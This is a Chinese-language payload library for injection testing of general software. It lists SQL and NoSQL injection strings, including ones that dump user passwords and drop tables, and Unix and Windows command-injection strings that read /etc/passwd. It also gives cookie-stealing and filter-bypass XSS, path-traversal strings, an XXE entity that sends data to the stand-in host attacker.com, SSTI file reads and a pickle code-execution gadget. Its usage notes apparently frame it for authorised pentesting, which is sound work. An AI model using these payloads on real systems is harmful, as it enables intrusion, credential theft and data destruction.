# 注入攻击载荷库 — 通用软件

> 用于 A2 类测试。按注入类型分类。

---

## SQL 注入

### 基本探针
```
' OR '1'='1
' OR '1'='1' --
" OR "1"="1
" OR "1"="1" --
' OR 1=1 --
admin'--
```

### 联合查询
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
```

### 时间盲注
```
' OR SLEEP(5)--
' OR pg_sleep(5)--
'; WAITFOR DELAY '00:00:05'--
```

### 堆叠查询
```
'; DROP TABLE users;--
'; UPDATE users SET password='hacked';--
```

### NoSQL 注入 (MongoDB)
```json
{"$gt": ""}
{"$ne": null}
{"$where": "1==1"}
{"username": {"$regex": "^admin"}}
```

---

## 命令注入

### Unix
```
; whoami
| whoami
`whoami`
$(whoami)
&& whoami
|| whoami
\n whoami
$(cat /etc/passwd)
```

### Windows
```
| whoami
& whoami
&& whoami
| dir C:\
& type C:\Windows\System32\drivers\etc\hosts
```

---

## XSS (跨站脚本)

### 基本探针
```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### 绕过过滤
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### 事件处理器
```html
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

---

## 路径穿越

```
../../../etc/passwd
..\..\..\Windows\System32\drivers\etc\hosts
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

## XXE (XML 外部实体)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/collect?data=">
]>
<root>&xxe;</root>
```

---

## SSTI (服务端模板注入)

### Jinja2 / Flask
```
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Thymeleaf
```
${7*7}
__${7*7}__::.x
```

### ERB (Ruby)
```
<%= 7*7 %>
<%= File.read('/etc/passwd') %>
```

---

## 反序列化攻击

### Java
- ysoserial 载荷（CommonsCollections、Spring 等）
- 检查 `ObjectInputStream` 是否有类型白名单

### Python (pickle)
```python
import pickle, os
pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

### Node.js
- `node-serialize` 的 `_$$ND_FUNC$$_` 注入
- `javascript-serialize` RCE

---

## 使用说明

1. 根据被测产品的技术栈选择对应载荷
2. 先从探针开始，确认有注入可能后再尝试具体利用
3. **注入确认可行后立即停止**，不要尝试更深的利用
4. 记录完整请求/响应用于报告
